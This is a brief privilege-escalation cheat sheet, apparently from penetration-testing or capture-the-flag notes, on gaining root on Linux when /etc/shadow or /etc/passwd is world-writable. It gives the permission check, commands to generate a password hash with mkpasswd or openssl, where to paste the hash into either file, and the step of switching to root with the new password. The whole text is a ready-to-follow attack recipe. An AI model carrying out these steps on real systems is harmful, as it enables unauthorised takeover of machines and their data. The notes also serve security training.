# if ls -l /etc/shadow output reads something similar to:
    -rw-r--rw- 1 root shadow 837 Apr 12 01:32 /etc/shadow

# replace user hash in /etc/shadow
    mkpasswd -m sha-512 <new password> will create a new hash
    Replace chosen user hash with new hash

# replace user hash in /etc/passwd
    openssl passwd <new password>
    Place new hash between first 2 colons of any user

# following each password generation, switch to root, using new password